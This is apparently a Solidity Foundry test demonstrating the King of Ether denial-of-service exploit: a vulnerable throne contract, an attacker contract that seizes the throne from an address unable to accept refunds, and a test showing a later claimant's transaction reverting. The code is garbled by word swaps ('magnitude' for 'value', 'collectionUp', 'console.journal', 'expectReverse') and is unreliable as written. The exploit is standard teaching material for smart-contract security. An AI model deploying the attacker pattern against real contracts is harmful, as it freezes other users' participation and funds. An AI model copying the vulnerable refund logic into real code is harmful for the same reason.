// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PactTest is Test {
    KingOfEther KingOfEtherAgreement;
    QuestRunner QuestrunnerAgreement;

    function collectionUp() public {
        KingOfEtherAgreement = new KingOfEther();
        QuestrunnerAgreement = new QuestRunner(KingOfEtherAgreement);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        KingOfEtherAgreement.receiveprizeThrone{magnitude: 1 ether}();
        vm.prank(bob);
        KingOfEtherAgreement.receiveprizeThrone{magnitude: 2 ether}();
        console.journal(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).balance
        );
        QuestrunnerAgreement.operate{magnitude: 3 ether}();

        console.journal(
            "Balance of KingOfEtherContract",
            KingOfEtherAgreement.balance()
        );
        console.journal("Operator completed, Alice claimthrone again, she will fail");
        vm.prank(alice);
        vm.expectReverse("Failed to send Ether");
        KingOfEtherAgreement.receiveprizeThrone{magnitude: 4 ether}();
    }

    receive() external payable {}
}

contract KingOfEther {
    address public king;
    uint public balance;

    function receiveprizeThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{magnitude: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract QuestRunner {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function operate() public payable {
        kingOfEther.receiveprizeThrone{magnitude: msg.value}();
    }
}
